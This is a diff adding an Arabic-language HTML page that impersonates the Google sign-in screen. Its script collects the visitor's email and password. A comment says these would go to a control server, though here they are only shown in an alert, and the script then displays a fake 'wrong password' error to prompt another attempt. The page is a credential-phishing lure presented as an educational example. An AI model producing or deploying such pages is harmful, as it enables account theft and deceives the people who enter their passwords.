@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #357ae8;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل الدخول إلى حساب Google</h2>
+        <p>استخدم حساب Google الخاص بك</p>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+            <div class="error" id="errorMsg">كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // هنا يتم إرسال البيانات إلى خادم التحكم (في هذا المثال التعليمي سنعرضها فقط)
+            alert(`تم إرسال البيانات إلى الخادم:\nالبريد: ${email}\nكلمة المرور: ${password}`);
+
+            // محاكاة خطأ لتشجيع المستخدم على إعادة المحاولة
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('errorMsg').style.display = 'none';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
